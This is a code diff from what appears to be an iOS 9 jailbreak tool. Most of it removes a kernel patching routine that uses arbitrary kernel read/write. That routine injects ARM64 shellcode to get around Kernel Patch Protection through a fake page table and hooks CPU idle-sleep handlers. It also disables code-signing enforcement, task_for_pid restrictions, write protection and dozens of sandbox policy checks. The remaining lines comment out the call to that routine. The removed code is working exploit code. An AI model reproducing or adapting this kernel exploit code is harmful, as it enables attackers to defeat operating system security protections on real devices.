-    printLog("level1_table: %llx", level1_table);
-    
-    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10) - gPhysBase + gVirtBase;
-    uint64_t cpu_data_paddr = ReadAnywhere64(cpu_list);
-    DEBUGLog("cpu_list: %llx", cpu_list);
-    DEBUGLog("cpu_data_paddr: %llx", cpu_data_paddr);
-    
-    uint64_t cpu_ttep = region + find_ttbr1_el1(region, kdata, ksize);
-    ttbr1_el1 = ReadAnywhere64(cpu_ttep);
-    printLog("ttbr1_el1: %llx", ttbr1_el1);
-    
-    /*-- Patchfinder64 - KPP --*/
-    uint64_t cpacr_addr = region + find_cpacr_el1(region, kdata, ksize);
-    uint64_t shtramp = region + ((const struct mach_header *)kernel_mh)->sizeofcmds + sizeof(struct mach_header_64);
-    
-    printLog("cpacr_addr: %llx", cpacr_addr);
-    printLog("shtramp: %llx", shtramp);
-    
-    /*-- Patchfinder64 - Jailbreak --*/
-    uint64_t mac_mount = region + find_mac_mount_patch(region, kdata, ksize);
-    
-    // sbops
-    uint64_t sbops = region + find_sandbox_mac_policy_ops(region, kdata, ksize);
-    
-    // LwVM
-    uint64_t lwvm_krnl_conf_got;
-    
-    if(lwvm_type == 1){
-        // 9.3.2-9.3.5
-        lwvm_krnl_conf_got = region + find_PE_i_can_has_kernel_configuration_got(region, kdata, ksize);
-    } else {
-        // -9.3.1
-        lwvm_krnl_conf_got = region + find_LwVM_PE_i_can_has_debugger_got(region, kdata, ksize);
-    }
-    
-    uint64_t lwvm_jump = region + find_lwvm_jump(region, kdata, ksize);
-    uint64_t debug_enabled = region + find_debug_enabled(region, kdata, ksize);
-    uint64_t amfi_allow_any_sign = region + find_amfi_allow_any_signature(region, kdata, ksize);
-    uint64_t amfi_ret = region + find_amfi_ret(region, kdata, ksize);
-    
-#ifdef PATCH_TFP0
-    uint64_t tfp0_addr = region + find_task_for_pid(region, kdata, ksize);
-    printLog("tfp0_addr: %llx", tfp0_addr);
-#endif
-    printLog("mac_mount: %llx", mac_mount);
-    printLog("sbops: %llx", sbops);
-    printLog("lwvm_krnl_conf: %llx", lwvm_krnl_conf_got);
-    printLog("lwvm_jump: %llx", lwvm_jump);
-    printLog("debug_enabled: %llx", debug_enabled);
-    printLog("amfi_allow_any_sign: %llx", amfi_allow_any_sign);
-    printLog("amfi_ret: %llx", amfi_ret);
-    
-    /*-- cpu --*/
-    uint64_t cpu = cpu_data_paddr;
-    uint64_t idlesleep_handler = 0;
-    
-    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
-    int z = 0;
-    int idx = 0;
-    int ridx = 0;
-    
-    while (cpu) {
-        cpu = cpu - gPhysBase + gVirtBase;
-        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
-            printLog("already jailbroken?, bailing out");
-            return -1;
-        }
-        
-        if (!idlesleep_handler) {
-            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
-            uint32_t* opcz = malloc(0x1000);
-            copyin(opcz, idlesleep_handler, 0x1000);
-            idx = 0;
-            while (1) {
-                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
-                    break;
-                }
-                idx++;
-            }
-            ridx = idx;
-            while (1) {
-                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
-                    break;
-                }
-                ridx++;
-            }
-        }
-        
-        DEBUGLog("found cpu: %x", ReadAnywhere32(cpu+0x330));
-        DEBUGLog("found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
-        
-        plist[z++] = cpu+0x130;
-        cpu_list += 0x10;
-        cpu = ReadAnywhere64(cpu_list);
-    }
-    
-    DEBUGLog("idlesleep_handler: %llx", idlesleep_handler);
-    
-    uint64_t regi = find_register_value(kdata, idlesleep_handler+12, 30);
-    uint64_t regd = find_register_value(kdata, idlesleep_handler+24, 30);
-    DEBUGLog("%llx, %llx", regi, regd);
-    
-    uint64_t ml_get_wake_timebase = region + find_ml_get_wake_timebase(region, kdata, ksize);
-    DEBUGLog("ml_get_wake_timebase: %llx", ml_get_wake_timebase);
-    
-    uint64_t preg = find_register_value(kdata, ml_get_wake_timebase+8, 8);
-    uint64_t reg = search_handler(preg, ReadAnywhere32(ml_get_wake_timebase+8));
-    DEBUGLog("reg: %llx, %llx, %llx", preg, reg, idlesleep_handler - gVirtBase + gPhysBase);
-    
-    /*-- fake ttbr --*/
-    uint64_t level0_pte = physalloc(0x1000);
-    char* bbuf = malloc(0x1000);
-    copyin(bbuf, ttbr1_el1 - gPhysBase + gVirtBase, 0x1000);
-    copyout(level0_pte, bbuf, 0x1000);
-    uint64_t physp = pagetable_lookup(level0_pte, ttbr1_el1, RETVAL_PHYS);
-    DEBUGLog("fake ttbr1_el1: %llx", physp);
-    
-    
-    /*-- shellcode --*/
-    uint64_t shellcode = physalloc(0x1000);
-    
-    WriteAnywhere32(shellcode + 0x100 + 0, 0x5800009e); /* trampoline for idlesleep */
-    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
-    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
-    
-    WriteAnywhere32(shellcode + 0x200 + 0, 0x5800009e); /* trampoline for deepsleep */
-    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
-    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
-    
-    uint64_t physcode = pagetable_lookup(shellcode, ttbr1_el1, RETVAL_PHYS);
-    DEBUGLog("physcode: %llx", physcode);
-    
-    /*-- shc --*/
-    uint64_t shc = physalloc(0x1000);
-    DEBUGLog("shc: %llx", shc);
-    for (int i = 0; i < 0x500/4; i++) {
-        WriteAnywhere32(shc+i*4, 0xd503201f); // nop
-    }
-    
-    {
-        WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
-        WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
-        WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
-        WriteAnywhere32(shc+12, 0xd5033fdf); // isb
-        WriteAnywhere32(shc+16, 0xd5033f9f); // dsb sy
-        WriteAnywhere32(shc+20, 0xd5033b9f); // dsb ish
-        WriteAnywhere32(shc+24, 0xd5033fdf); // isb
-        WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
-        WriteAnywhere32(shc+32, 0xd65f03c0); // ret
-        WriteAnywhere64(shc+40, regi);  // idlesleep
-        WriteAnywhere64(shc+48, physp); // ttbr1_el1_fake
-        
-        WriteAnywhere32(shc+0x100,    0x5800019e); // ldr x30, #40
-        WriteAnywhere32(shc+0x100+4,  0xd518203e); // msr ttbr1_el1, x30
-        WriteAnywhere32(shc+0x100+8,  0xd508871f); // tlbi vmalle1
-        WriteAnywhere32(shc+0x100+12, 0xd5033fdf); // isb
-        WriteAnywhere32(shc+0x100+16, 0xd5033f9f); // dsb sy
-        WriteAnywhere32(shc+0x100+20, 0xd5033b9f); // dsb ish
-        WriteAnywhere32(shc+0x100+24, 0xd5033fdf); // isb
-        WriteAnywhere32(shc+0x100+28, 0x5800007e); // ldr x30, 8
-        WriteAnywhere32(shc+0x100+32, 0xd65f03c0); // ret
-        WriteAnywhere64(shc+0x100+40, regd);  // deepsleep
-        WriteAnywhere64(shc+0x100+48, physp); // ttbr1_el1_fake
-    }
-    
-    {
-        WriteAnywhere32(shc+0x400+0x00, 0xb9400301); // ldr w1, [x24]
-        WriteAnywhere32(shc+0x400+0x04, 0x32060021); // orr w1, w1,   #0x04000000
-        WriteAnywhere32(shc+0x400+0x08, 0x32000c21); // orr w1, w1,   #0x000f
-        WriteAnywhere32(shc+0x400+0x0c, 0x12126421); // and w1, w1, #(~0x3f00)
-        WriteAnywhere32(shc+0x400+0x10, 0xb9000301); // str w1, [x24]
-        WriteAnywhere32(shc+0x400+0x14, 0xaa1f03e0); // mov x0, xzr
-        WriteAnywhere32(shc+0x400+0x18, 0xd10143bf); // sub sp, x29, #0x50
-        WriteAnywhere32(shc+0x400+0x1c, 0xa9457bfd); // ldp x29, x30, [sp, #0x50]
-        WriteAnywhere32(shc+0x400+0x20, 0xa9444ff4); // ldp x20, x19, [sp, #0x40]
-        WriteAnywhere32(shc+0x400+0x24, 0xa94357f6); // ldp x22, x21, [sp, #0x30]
-        WriteAnywhere32(shc+0x400+0x28, 0xa9425ff8); // ldp x24, x23, [sp, #0x20]
-        WriteAnywhere32(shc+0x400+0x2c, 0xa94167fa); // ldp x26, x25, [sp, #0x10]
-        WriteAnywhere32(shc+0x400+0x30, 0xa8c66ffc); // ldp x28, x27, [sp], #0x60
-        WriteAnywhere32(shc+0x400+0x34, 0xd65f03c0); // ret
-    }
-    
-    mach_vm_protect(tfp0, shc, 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-    
-    /*-- shellcode --*/
-    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
-    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
-    
-    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
-    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
-    
-    //mach_vm_protect(tfp0, shellcode, 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-    
-    /*-- kppsh --*/
-    uint64_t kppsh = physalloc(0x1000);
-    DEBUGLog("kppsh: %llx", kppsh);
-    
-    {
-        WriteAnywhere32(kppsh+0x00, 0x580001e1); // ldr    x1, #60
-        WriteAnywhere32(kppsh+0x04, 0x58000140); // ldr    x0, #40
-        WriteAnywhere32(kppsh+0x08, 0xd5182020); // msr    TTBR1_EL1, x0
-        WriteAnywhere32(kppsh+0x0c, 0xd2a00600); // movz   x0, #0x30, lsl #16
-        WriteAnywhere32(kppsh+0x10, 0xd5181040); // msr    CPACR_EL1, x0
-        WriteAnywhere32(kppsh+0x14, 0xd5182021); // msr    TTBR1_EL1, x1
-        WriteAnywhere32(kppsh+0x18, 0x10ffffe0); // adr    x0, #-4
-        WriteAnywhere32(kppsh+0x1c, 0xd5033b9f); // dsb    ish (4k)
-        WriteAnywhere32(kppsh+0x20, 0xd508871f); // tlbi   vmalle1 (4k)
-        WriteAnywhere32(kppsh+0x24, 0xd5033fdf); // isb
-        WriteAnywhere32(kppsh+0x28, 0xd65f03c0); // ret
-        WriteAnywhere64(kppsh+0x2c, ttbr1_el1);
-        WriteAnywhere64(kppsh+0x34, physp);
-        WriteAnywhere64(kppsh+0x3c, physp);
-    }
-    
-    mach_vm_protect(tfp0, kppsh, 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-    
-    sleep(1);
-    
-    {
-        printLog("[*] Remapping CPACR_EL1");
-        uint64_t new_cpacr_addr = fakepage_lookup(cpacr_addr, physp);
-        WriteAnywhere32(new_cpacr_addr, 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));// call kppsh
-        
-        // Remapping shtramp
-        uint64_t new_shtramp = fakepage_lookup(shtramp, physp);
-        WriteAnywhere32(new_shtramp,   0x58000041); // ldr      x1, =kppsh
-        WriteAnywhere32(new_shtramp+4, 0xd61f0020); // br       x1
-        WriteAnywhere64(new_shtramp+8, kppsh);      // .quad    _kppsh
-    }
-    
-    printLog("Jailbreaking");
-    
-#ifdef PATCH_TFP0
-    {
-        uint64_t new_tfp0_addr = fakepage_lookup(tfp0_addr, physp);
-        WriteAnywhere32(new_tfp0_addr, 0xd503201f);
-        printLog("[patched] tfp0");
-    }
-#endif
-    
-    {
-        uint64_t new_debug_enabled = fakepage_lookup(debug_enabled, physp);
-        WriteAnywhere32(new_debug_enabled, 1);
-        printLog("[patched] debug_enabled");
-    }
-    
-    {
-        // LwVM
-        printLog("[LwVM] _PE_i_can_has_kernel_configuration: isWriteProtected check bypass");
-        DEBUGLog("LwVM: %llx, %llx", lwvm_krnl_conf_got, lwvm_jump);
-        WriteAnywhere64(lwvm_krnl_conf_got, lwvm_jump);
-    }
-    
-    {
-        // mac_mount
-        uint64_t new_mac_mount = fakepage_lookup(mac_mount, physp);
-        WriteAnywhere32(new_mac_mount, 0x14000020); // tbnz w20, 0x0, _addr -> b _addr
-        printLog("[patched] _mac_mount");
-    }
-    
-    {
-        uint64_t amfi_get_out_of_my_way     = amfi_allow_any_sign+1;
-        uint64_t cs_enforcement_disable     = amfi_allow_any_sign+2;
-        
-        DEBUGLog("amfi_get_out_of_my_way: %llx", amfi_get_out_of_my_way);
-        DEBUGLog("cs_enforcement_disable: %llx", cs_enforcement_disable);
-        
-        uint64_t new_amfi_get_out_of_my_way = fakepage_lookup(amfi_get_out_of_my_way, physp);
-        uint64_t new_cs_enforcement_disable = fakepage_lookup(cs_enforcement_disable, physp);
-        
-        WriteAnywhere8(new_amfi_get_out_of_my_way, 1); // _allowEverything
-        WriteAnywhere8(new_cs_enforcement_disable, 1); // _csEnforcementDisable
-        
-        printLog("[patched] cs_enforcement_disable");
-        printLog("[patched] amfi_get_out_of_my_way");
-        
-        uint64_t newa = fakepage_lookup(amfi_ret, physp);
-        WriteAnywhere32(newa,   0x58000041); // ldr      x1, =amfi
-        WriteAnywhere32(newa+4, 0xd61f0020); // br       x1
-        WriteAnywhere64(newa+8, shc+0x400);  // .quad    _amfi
-        printLog("[patched] amfi shellcode");
-        
-    }
-    
-    
-    {
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), physp);
-        
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl), physp);
-        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke), physp);
-        
-        printLog("[Sandbox] sandbox mac_policy_ops");
-    }
-    
-    sleep(1);
-    
-    // set faketable
-    level1_table = physp - gPhysBase + gVirtBase;
-    WriteAnywhere64(ReadAnywhere64(pmap_location), level1_table);
-    
-    // switch to fake TTBR1_EL1
-    if(ReadAnywhere64(reg+8) == idlesleep_handler - gVirtBase + gPhysBase + 0xc){
-        DEBUGLog("Found start_cpu_paddr: %llx", reg+8);
-        WriteAnywhere64(reg+8,  physcode + 0x200); // _start_cpu_paddr
-    }
-    if(ReadAnywhere64(reg+0x18) == idlesleep_handler - gVirtBase + gPhysBase){
-        DEBUGLog("Found resume_idle_cpu_paddr: %llx", reg+0x18);
-        WriteAnywhere64(reg+0x18,  physcode + 0x100); // _resume_idle_cpu_paddr
-    }
-    
-    /*-- hook idlesleep handler --*/
-    for (int i = 0; i < z; i++) {
-        WriteAnywhere64(plist[i], physcode + 0x100); // _resume_idle_cpu_paddr
-    }
-    
-    printLog("enabled patches");
-    
-    sleep(1);
-    
-    return 0;
-}
-
-int unjail9(mach_port_t pt, uint64_t region, int lwvm_type, int kpp)
+int unjail9(mach_port_t pt, kaddr_t region, int lwvm_type, int kpp)
 {
     int ret=0;
     
     tfp0 = pt;
     
-    if(kpp == 1){
-        ret = kpp9(region, lwvm_type);
-        
-        char *nmz = strdup("/dev/disk0s1s1");
-        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz); // remount?
-        printLog("remounting: %d", rv);
-        
-    } else {
-        ret = kpatch9(region, lwvm_type);
-        // already remounted
-    }
+    //if(kpp == 1){
+    //    ret = kpp9(region, lwvm_type);
+    //
+    //    char *nmz = strdup("/dev/disk0s1s1");
+    //    int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz); // remount?
+    //    printLog("remounting: %d", rv);
+    //
+    //} else {
+    ret = kpatch9(region, lwvm_type);
+    //    // already remounted
+    //}
     
     return ret;
 }
